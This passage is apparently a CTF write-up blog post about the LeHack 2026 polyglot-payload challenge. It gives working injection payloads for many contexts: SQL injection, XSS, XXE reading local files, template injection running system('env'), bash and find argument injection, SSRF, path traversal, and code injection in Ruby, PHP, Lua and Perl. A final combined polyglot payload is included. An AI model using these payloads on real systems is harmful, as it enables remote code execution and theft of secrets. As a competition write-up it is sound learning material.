+<p>ℹ️ I believe there is still a way to make it work, but I wasn't able to find it in the required time.</p>
+<h3 id="ruby-code-injection">Ruby Code Injection</h3>
+<p><strong>Description</strong>: inject Ruby source into a double-quoted string assignment and print the flag from the environment.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="ruby"><span class="giallo-l"><span style="color: #FFAB70;">value</span><span style="color: #F97583;"> =</span><span style="color: #9ECBFF;"> &quot;$INPUT&quot;</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="ruby"><span class="giallo-l"><span style="color: #9ECBFF;">&quot;; puts ENV[&#39;FLAG&#39;]; x=&quot;</span></span></code></pre>
+<p>ℹ️ The final branch used Ruby truthiness: <code>0</code> is truthy in Ruby, so Ruby enters the first dispatcher and runs <code>system('env')</code>.</p>
+<h3 id="php-code-injection">PHP Code Injection</h3>
+<p><strong>Description</strong>: inject PHP source into a double-quoted string assignment and print the flag from the environment.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="php"><span class="giallo-l"><span>$value</span><span style="color: #F97583;"> =</span><span style="color: #9ECBFF;"> &quot;</span><span>$INPUT</span><span style="color: #9ECBFF;">&quot;</span><span>;</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="php"><span class="giallo-l"><span style="color: #9ECBFF;">&quot;; echo getenv(&#39;FLAG&#39;); </span><span>$x</span><span style="color: #9ECBFF;">=&quot;</span></span></code></pre>
+<p>ℹ️ The final payload also uses PHP's real <code>__halt_compiler()</code> to stop PHP parsing before the Lua-style <code>--</code> comment suffix.</p>
+<h3 id="lua-code-injection">Lua Code Injection</h3>
+<p><strong>Description</strong>: inject Lua source into a double-quoted string assignment and print the flag from the environment.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="lua"><span class="giallo-l"><span style="color: #F97583;">local</span><span> value</span><span style="color: #F97583;"> =</span><span style="color: #9ECBFF;"> &quot;$INPUT&quot;</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="lua"><span class="giallo-l"><span style="color: #9ECBFF;">&quot;; print(os.getenv(&#39;FLAG&#39;)); local x=&quot;</span></span></code></pre>
+<p>The final payload used <code>os.execute('env')</code> in a <code>print(...)</code> wrapper because Lua does not allow a bare boolean expression as a statement.</p>
+<h3 id="perl-code-injection">Perl Code Injection</h3>
+<p><strong>Description</strong>: inject Perl source into a double-quoted string assignment and print the flag from the environment.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="perl"><span class="giallo-l"><span style="color: #F97583;">my</span><span> $value = </span><span style="color: #9ECBFF;">&quot;</span><span>$INPUT</span><span style="color: #9ECBFF;">&quot;</span><span>;</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="perl"><span class="giallo-l"><span style="color: #9ECBFF;">&quot;; print </span><span>$ENV</span><span style="color: #9ECBFF;">{FLAG}; my </span><span>$x</span><span style="color: #9ECBFF;">=&quot;</span></span></code></pre>
+<p>The final branch used <code>system('env')</code> and tolerated later runtime errors because the oracle accepted output that already contained the flag.</p>
+<h3 id="ssrf">SSRF</h3>
+<p><strong>Description</strong>: make the backend fetch an internal <code>/flag</code> endpoint. The challenge prepends <code>http://</code>, sends <code>FLAG</code> as request data, and reads up to 1024 bytes from the response.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>http://$INPUT</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>127.0.0.1/flag</span></span></code></pre>
+<p>ℹ️ The final payload used <code>@0/flag#</code>: the preceding bytes became URL userinfo, <code>0</code> became the host, <code>/flag</code> became the path, and <code>#</code> hid the rest as a fragment.</p>
+<h3 id="path-traversal">Path Traversal</h3>
+<p><strong>Description</strong>: read <code>/dev/shm/flag.txt</code> after the backend joins input with <code>/tmp</code>, normalizes the path, and opens it.</p>
+<p><strong>Source</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>$INPUT</span></span></code></pre>
+<p><strong>Input</strong>:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>/../../../../dev/shm/flag.txt</span></span></code></pre>
+<p>The final suffix kept enough <code>../</code> segments to normalize from the <code>/tmp</code> base to the flag file.</p>
+<h2 id="polyglot">Polyglot</h2>
+<p>Let's summarize the different tricks and constraint used to build the polyglot:</p>
+<ul>
+<li>Start with either XXE or SQLi 2 because they are mutually exclusive</li>
+<li>End with <code>/dev/shm/flag.txt</code> and enought <code>../</code> to remove the <code>/</code> left by other payloads</li>
+<li>Use the URL format <code>user:pass@host/endpoint#fragment</code> to insert other payloads</li>
+<li>Localhost has a few equivalent addresses like <code>http://0</code> and <code>http://0.0.0.0</code></li>
+<li><code>__halt_compiler()</code> function stops PHP interpreter. <a rel="external" href="https://www.php.net/manual/en/function.halt-compiler.php">php.net/halt-compiler</a></li>
+<li>Use the NFKC normalization for the SQLi 1 payload</li>
+<li>Ending a <code>&lt;script&gt;</code> tag and opening a new one can be used to place the garbage code in the first tag without affecting the second context.</li>
+<li>Most of the time calling directly the environment loaded inside the current script instead of calling the function is shorter</li>
+<li>Claude is your best friend when it comes to fix your brainfuck payloads and find "keywords/features" in the language RFC.</li>
+<li>Use type juggling to branch between each languages (Python, PHP, Lua, Perl, Ruby)</li>
+</ul>
+<table><thead><tr><th>Language</th><th style="text-align: right"><code>0</code> truthy?</th><th style="text-align: right"><code>self</code> truthy?</th><th>Branch</th></tr></thead><tbody>
+<tr><td>Ruby</td><td style="text-align: right">yes</td><td style="text-align: right">yes</td><td>Ruby <code>system('env')</code></td></tr>
+<tr><td>Lua</td><td style="text-align: right">yes</td><td style="text-align: right">no / nil</td><td>Lua <code>os.execute('env')</code></td></tr>
+<tr><td>Python</td><td style="text-align: right">no</td><td style="text-align: right">not reached</td><td>Python fallback</td></tr>
+<tr><td>PHP/Perl</td><td style="text-align: right">no-ish for this selector</td><td style="text-align: right">not reached</td><td>PHP/Perl branch</td></tr>
+</tbody></table>
+<p>My first payload working with the XXE context looked like that:</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="xml"><span class="giallo-l"><span>&lt;?</span><span style="color: #85E89D;">or</span><span> 1</span><span style="color: #B392F0;"> union select</span><span> ＂&gt;[.&gt;],[.,]＂,flag,0</span><span style="color: #B392F0;"> from flag--</span><span>＇union</span><span style="color: #B392F0;"> select flag</span><span>,0,0</span><span style="color: #B392F0;"> from flag--</span><span>?&gt;&lt;!</span><span style="color: #F97583;">DOCTYPE</span><span style="color: #79B8FF;"> a</span><span>[&lt;!</span><span style="color: #F97583;">ENTITY</span><span style="color: #79B8FF;"> b</span><span style="color: #F97583;"> SYSTEM </span><span style="color: #9ECBFF;">&#39;file:///dev/shm/flag.txt&#39;</span><span>&gt;]&gt;&lt;</span><span style="color: #85E89D;">a</span><span>&gt;</span><span style="color: #79B8FF;">&amp;b;</span><span>&lt;/</span><span style="color: #85E89D;">a</span><span>&gt;&lt;/</span><span style="color: #85E89D;">script</span><span>&gt;&lt;</span><span style="color: #85E89D;">img</span><span style="color: #B392F0;"> src</span><span>=x</span><span style="color: #B392F0;"> onerror</span><span>=alert(flag)&gt;{system(&#39;env&#39;)}{*{%if lipsum is defined%}{{lipsum.__globals__[&#39;os&#39;].system(&#39;env&#39;)}}{%else%}{{[&#39;env&#39;]|filter(&#39;system&#39;)}}{%endif%}*}&lt;%=`env`%&gt;&#39;;env;&#39;&quot;]|*?&gt;&quot;;print $ENV{FLAG}#/../../../../../../../proc/self/environ</span></span></code></pre>
+<p>My first working non-XXE baseline solved 18 contexts with a compact SQL/HTML/template/shell/path payload. It failed Python, JavaScript, Lua, and XXE. Adding Python raised the result to 19/22 by using a truthiness selector shared by Python, Ruby, PHP, and Perl. Adding Lua required a larger rewrite because Lua cannot execute a bare <code>and/or</code> expression as a statement; wrapping the dispatcher in <code>print(...)</code> made it valid Lua and produced the final 20/22 branch.</p>
+<p>Several constraints made the merge fragile.</p>
+<p>Normal spaces were expensive because Bash3 used <code>escapeshellcmd($payload)</code> inside <code>find /tmp -type d -name ...</code>. Extra spaces inside the runtime branch split the argument too early and broke the final <code>-o -exec env</code> suffix. The final runtime branch therefore uses no-space forms such as <code>define_method(:__halt_compiler){}</code> and <code>*__halt_compiler=sub{}</code>.</p>
+<p>The code runners parsed the entire payload, not just the first executed statement. That meant a successful <code>env</code> print was useless if another language saw a parse error before execution. The <code>__halt_compiler();pos=0;--pos#</code> tail was the key bridge for PHP, Lua, Python, Ruby, and Perl, because it let each parser ignore the Bash/path suffix in a different way.</p>
+<p>JavaScript was the remaining code-runner problem. A raw JavaScript breakout like <code>";console.log(process.env.FLAG)//</code> works for Node, and SQLite even accepts it inside a quoted alias in a spare UNION column. However, the same raw double quote also closes the Python, Ruby, PHP, and Perl wrappers too early, moving execution before the carefully balanced dispatcher.</p>
+<p>Encoding tricks such as HTML entities, <code>%22</code>, <code>\x22</code>, <code>\u0022</code>, and fullwidth quotes did not help because the Node source parser does not HTML-decode or URL-decode source bytes. A later interpolation branch solved JavaScript in targeted tests, but it lost Lua and Smarty in the full run, so it did not beat the 20/22 payload.</p>
+<p>XXE and SQLi2 were the other major conflict. XXE wants the payload to be XML-shaped immediately after <code>&lt;?xml version="1.0"?&gt;</code>, with a <code>&lt;!DOCTYPE ...&gt;</code> before the root element. SQLi2 wants the same payload to be a valid SQLite expression immediately after <code>age &gt;</code>, which means it must start as a numeric SQL expression. Starting with XML (<code>&lt;!--...&lt;!DOCTYPE...</code>) solves XXE but SQLite rejects it in SQLi2. Starting with <code>0 union select ...</code> solves SQLi2 but cannot be parsed as a pre-root XML DTD. We built an XXE-first branch using XML comments, CR as XML-safe whitespace, and URL userinfo tricks; it solved XXE but lost SQLi2. We also tried transplanting separators, but form-feed is invalid in XML grammar and <code>--</code> cannot appear freely inside XML comments. Without a new parser differential that makes the same leading bytes both valid SQL numeric expression and valid XML pre-root/DOCTYPE structure, XXE and SQLi2 remained unmergeable.</p>
+<p>The final verified payload therefore intentionally maximized the stable non-XXE route and accepted two failures: <code>XXE</code> and <code>JavaScript</code>.</p>
+<p>Polyglot fragment summary:</p>
+<table><thead><tr><th>context language</th><th>payload</th></tr></thead><tbody>
+<tr><td>XSS 1 HTML</td><td><code>&lt;svg\fonload=alert(flag)&gt;</code> via the shared <code>&lt;/script&gt;&lt;svg\fonload=alert(flag)&gt;</code> fragment</td></tr>
+<tr><td>XSS 2 script string</td><td><code>&lt;/script&gt;&lt;svg\fonload=alert(flag)&gt;</code></td></tr>
+<tr><td>SQLi 1 quoted SQLite with NFKC</td><td><code>＇union\fselect*,0,0\ffrom\fflag--</code></td></tr>
+<tr><td>SQLi 2 unquoted SQLite</td><td><code>0\funion\fselect\f2...,*,*from\fflag--</code></td></tr>
+<tr><td>XPath</td><td><code>[\"]|*?</code></td></tr>
+<tr><td>Jinja</td><td><code>{{['env']|map('system')and\flipsum.__globals__.os.environ}}</code></td></tr>
+<tr><td>Brainfuck</td><td><code>[.&gt;],[.,]</code></td></tr>
+<tr><td>ERB</td><td><code>&lt;%=ENV.to_h%&gt;</code></td></tr>
+<tr><td>Twig</td><td><code>{{['env']|map('system')...}}</code></td></tr>
+<tr><td>Smarty</td><td><code>{system(env)}</code></td></tr>
+<tr><td>Bash 1</td><td><code>';env;#</code></td></tr>
+<tr><td>Bash 2</td><td><code>`env;'";..."`</code> command-substitution desync</td></tr>
+<tr><td>Bash 3 / find argument injection</td><td><code>-o -exec env ; -name ...</code></td></tr>
+<tr><td>XXE</td><td>Not in final payload; solved only by the alternate XML-first branch</td></tr>
+<tr><td>Python</td><td><code>__import__('os').system('env')</code> in the fallback branch</td></tr>
+<tr><td>JavaScript</td><td>Not solved in final payload</td></tr>
+<tr><td>Ruby</td><td><code>system('env')</code> in the <code>0</code> truthy + <code>self</code> branch</td></tr>
+<tr><td>PHP</td><td><code>system('env')</code> plus real <code>__halt_compiler()</code></td></tr>
+<tr><td>Lua</td><td><code>rawset(...print)and os.execute('env')</code> in the <code>0</code> truthy + no-<code>self</code> branch</td></tr>
+<tr><td>Perl</td><td><code>system('env')or eval('*__halt_compiler=sub{}')or 1</code></td></tr>
+<tr><td>SSRF</td><td><code>@0/flag#</code> after userinfo bytes</td></tr>
+<tr><td>Path traversal</td><td><code>/../../../../dev/shm/flag.txt</code></td></tr>
+</tbody></table>
+<h2 id="conclusion">Conclusion</h2>
+<p>This year again the challenge was fun and the web interface was very stable, shoutout to the organizer <a rel="external" href="https://x.com/yeswehack">@yeswehack</a> and the authors <a rel="external" href="https://x.com/BitK_">@BitK_</a> &amp;&amp; <a rel="external" href="https://x.com/Brumens2">@Brumens2</a>.</p>
+<p>Now I'm expecting a 3rd edition with 50+ contexts, I don't know if the infrastructure could handle it but that would be evil 😈</p>
+<h3 id="side-note">Side Note</h3>
+<p>Side note for the other challengers.</p>
+<p>Some of you came last friday (06/26/2026) on this blog to copy last year payload, well played 😏.
+Here is my final solution for the challenge, it is not the best, but maybe it could help you for 2027 edition ? 🤫</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>0\funion\fselect\f2`[.&gt;],[.,]`,*,*from\fflag--@0/flag#＇union\fselect*,0,0\ffrom\fflag--&lt;/script&gt;&lt;svg\fonload=alert(flag)&gt;&#39;;env;#&lt;%=ENV.to_h%&gt;{system(env)}{*{{[&#39;env&#39;]|map(&#39;system&#39;)and\flipsum.__globals__.os.environ}}*}[\&quot;]|*?`env;&quot;;print(((0)and(self and(eval(&#39;define_method(:__halt_compiler){}&#39;)and system(&#39;env&#39;))or(rawset(_G,&#39;__halt_compiler&#39;,rawget(_G,&#39;print&#39;))and os.execute(&#39;env&#39;)))or(&#39;0&#39;==0)and(system(&#39;env&#39;)or eval(&#39;*__halt_compiler=sub{}&#39;)or 1)or(globals().__setitem__(&#39;__halt_compiler&#39;,bool)or __import__(&#39;os&#39;).system(&#39;env&#39;))));__halt_compiler();pos=0;--pos#&quot;` -o -exec env ; -name /../../../../dev/shm/flag.txt</span></span></code></pre>
+<p>Final result:</p>
+<table><thead><tr><th>Info</th><th></th></tr></thead><tbody>
+<tr><td>Solved</td><td><code>20/22</code></td></tr>
+<tr><td>Score</td><td><code>19390</code></td></tr>
+<tr><td>Length</td><td><code>610</code></td></tr>
+<tr><td>Global leaderboard</td><td>3rd</td></tr>
+<tr><td>On-site leaderboard</td><td>2nd</td></tr>
+<tr><td>Failed contexts</td><td><code>xxe</code>, <code>javascript</code></td></tr>
+</tbody></table>
+<p><img src="/images/LeHACK2026/scoreboard.png" alt="" /></p>
+</section>
+  <hr />
+  <!-- Post Taxonomies -->
+
+  <!-- Post Nav -->
+<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
+  <a
+    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/payload-plz/" accesskey="."
+    ><span>LeHack 2025 - Payload PLZ</span><span class="ml-1.5">&#8250;</span></a>
+</nav>
+
+  <!-- Begin Page End inject -->
+  <!-- Share page -->
+<br>
+
+<div class="robots-nocontent social-share-buttons">
+  <b>Share this content</b>
+  <br>
+  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+    <a class="a2a_button_x"></a>
+    <a class="a2a_button_linkedin"></a>
+    <a class="a2a_button_telegram"></a>
+    <a class="a2a_button_mastodon"></a>
+    <a class="a2a_button_email"></a>
+    <a class="a2a_button_microsoft_teams"></a>
+    <a class="a2a_button_threads"></a>
+    <a class="a2a_button_bluesky"></a>
+    <a class="a2a_button_whatsapp"></a>
+  </div>
+  <br>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+</div>
+  <!-- End Page End inject -->
+</article>
+
+  </main>
+  <!-- Footer -->
+<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+  <a rel="external" href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2026">2026</time> Swissky</a>
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <span class="mr-6 lg:ml-6">
+      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
+    </span>
+    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
+  </div>
+  <!-- Begin Footer inject -->
+  
+  <!-- End Footer inject -->
+</footer>
+
+  
+  <!-- Begin Body End inject -->
+  
+  <!-- End Body End inject -->
+</body>
+
+</html>
